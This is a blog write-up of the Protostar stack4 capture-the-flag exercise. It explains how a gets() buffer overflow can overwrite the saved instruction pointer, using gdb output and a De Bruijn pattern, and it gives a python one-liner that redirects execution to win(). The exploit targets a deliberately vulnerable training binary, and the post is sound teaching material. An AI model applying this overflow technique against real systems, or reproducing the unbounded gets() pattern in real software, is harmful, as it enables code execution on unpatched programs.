---
layout: post
title: Protostar Writeup - stack4
updated: 2018-08-01 21:00
tags: [ctf, binary exploit, protostar, tech]
---

## Protostar - stack4

Moving on to stack4. This is a really good one. It will test your knowledge of how function calls work.
Before moving forward, I strongly recommend that you try this one yourself, it's not that easy though :).
Here's the code we're given:

{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
    printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
    char buffer[64];

    gets(buffer);
}
{% endhighlight %}

This code is similar to the previous challenge code, with the exception of the function pointer.
Again our attack plan will target the "gets()" function. First let's debug this code and see what we can find.

{% highlight shell %}
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   ebp
0x08048409 <main+1>:	mov    ebp,esp
0x0804840b <main+3>:	and    esp,0xfffffff0
0x0804840e <main+6>:	sub    esp,0x50
0x08048411 <main+9>:	lea    eax,[esp+0x10]
0x08048415 <main+13>:	mov    DWORD PTR [esp],eax
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave
0x0804841e <main+22>:	ret
{% endhighlight %}

Not much to work with here, other than the "gets()" function. If you take a look at the task description, it's clear that we somehow have to change the value of the EIP register.
So what is the EIP register? EIP stands for the Extended Instruction Pointer. For simplicity sake I am going to refer to it as just Instruction Pointer or IP for short. What's so special about this register?
The IP is responsible for storing the address of the next instruction to be executed. This should make it intuitive as to why we want to override the EIP value. If it's not, I'll try my best to explain it to you.

Say we are executing some assembly instructions located at location 0x01, then the Instruction Pointer points to 0x02. That's it, that's all the Instruction Pointer does, stores the address of the next instruction to be executed.
Now if we can somehow modify the EIP's contents, we can get our program to jump to a location of our choice and continue execution from that location. But this doesn't make sense, the registers are located on the CPU, and the overflow occurs on the stack.
So how does EIP get modified in the first place? If you dig a little deeper, and look at the `call` instruction of assembly, you'll see that it 'pushes' the value of EIP onto the stack(solves the mystery!), and when the function returns, the value of EIP is restored.
Makes sense since we need to continue executing code after a function call so we need some way of storing that location, and the stack is where we do this storing.

Now unlike the previous programs, you can't really predict where the EIP will be on the stack, it's more of trial and error. With this knowledge in mind, let's get to work.

First let's get the offset of the EIP. I like using [De Brujin patterns](https://en.wikipedia.org/wiki/De_Bruijn_sequence) for this. You can create your own patterns.
I create mine using [pwntools](http://docs.pwntools.com/en/stable/). I'm using the debugger to get the address, because without it, all you see is a 'Segmentation Fault' which is not very helpful.

{% highlight shell %}
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   ebp
0x08048409 <main+1>:	mov    ebp,esp
0x0804840b <main+3>:	and    esp,0xfffffff0
0x0804840e <main+6>:	sub    esp,0x50
0x08048411 <main+9>:	lea    eax,[esp+0x10]
0x08048415 <main+13>:	mov    DWORD PTR [esp],eax
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave
0x0804841e <main+22>:	ret
End of assembler dump.
(gdb) r
Starting program: /opt/protostar/bin/stack4
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
{% endhighlight %}

So we managed to change the EIP to "0x63413563". Calculating the offset, we see that the EIP is located on the stack at a distance of 76 bytes.
This becomes our padding. That's one half of the job done. Now we need to get the location of the `win()` function.

{% highlight shell %}
(gdb) p win
$1 = {void (void)} 0x80483f4 <win>
{% endhighlight %}

This is the address of the `win()` location. Combining this address with the padding is all we need to exploit this binary.
Let's craft and use our exploit.

{% highlight shell %}
$ python -c "print 'A'*76 + '\xf4\x83\x04\x08'" | ./stack4
code flow successfully changed
Segmentation fault
{% endhighlight %}

Success! The reason we get a segmentation fault is because we didn't use an offical 'call' instruction. And EIP restores garbage when it actually returns from the `win()` function.

### Sites

[Protostar](https://exploit-exercises.com/protostar/)
[Phrack](http://phrack.org/issues/49/14.html)
